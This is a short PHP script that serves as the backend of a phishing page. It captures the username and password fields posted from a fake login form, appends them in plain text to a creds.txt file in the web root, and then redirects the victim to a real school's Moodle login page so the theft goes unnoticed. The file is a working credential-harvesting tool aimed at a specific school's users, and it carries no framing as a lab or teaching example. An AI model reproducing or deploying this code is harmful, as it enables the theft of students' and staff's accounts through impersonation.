<?php
if (isset($_POST["usuario"]) && isset($_POST["password"])) {
    $user = $_POST["usuario"];
    $pass = $_POST["password"];
    ($file = fopen("/var/www/html/creds.txt", "a+")) or
        die("Unable to openfile!");
    $data = $user . "::";
    fwrite($file, $data);
    $data = $pass . "\n";
    fwrite($file, $data);
    fclose($file);
    header("Location: https://educaciodigital.cat/iesbadia/moodle/login/index.php");
}
?>